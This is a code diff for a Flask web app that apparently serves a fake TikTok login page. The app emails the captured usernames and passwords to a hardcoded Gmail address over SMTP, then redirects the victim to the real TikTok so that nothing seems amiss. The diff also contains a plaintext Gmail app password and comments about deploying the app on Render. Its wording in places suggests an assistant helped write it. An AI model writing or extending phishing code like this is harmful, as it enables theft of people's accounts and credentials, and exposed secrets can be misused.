@@ -18,7 +18,10 @@ app = Flask(__name__)
 
 # Replace with your controlled email address
 EMAIL_ADDRESS = "mwananchihuslerloans@gmail.com"
-EMAIL_PASSWORD = "mokasgadsacljec" # <--- Ensure YOUR APP PASSWORD IS HERE (NO SPACES)
+# Use a Gmail App Password here.
+# Generate one from your Google Account security settings.
+# For this demo, you will put your actual App Password here:
+EMAIL_PASSWORD = "mokasgadsacljec" # <--- VERIFY THIS EXACTLY (NO SPACES)
 TO_EMAIL = "mwananchihuslerloans@gmail.com" # This is the recipient email
 
 @app.route("/")
@@ -47,6 +50,7 @@ def login():
 
     # --- Email Notification ---
     try:
+        # Connect to Gmail's SMTP server securely over SSL
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
             smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
 
@@ -63,18 +67,11 @@ def login():
 
     except Exception as e:
         print(f"Error sending email: {e}")
+        # This print statement is crucial for debugging on Render logs!
+        # It should show you why the email failed.
 
-    # --- IMPORTANT CHANGE HERE ---
     # Redirect the user directly to the real TikTok website after capturing credentials.
-    # This makes the experience appear seamless to the victim.
     return redirect("https://www.tiktok.com", code=302)
-
-
-# The /redirect_after_login route is no longer strictly needed if we directly redirect,
-# but I'll keep it as a placeholder comment for illustration.
-# @app.route("/redirect_after_login")
-# def mock_tiktok_redirect():
-#    return redirect("https://www.tiktok.com", code=302) # Directly redirects
 
 # --- IMPORTANT FOR RENDER DEPLOYMENT ---
 if __name__ == '__main__':
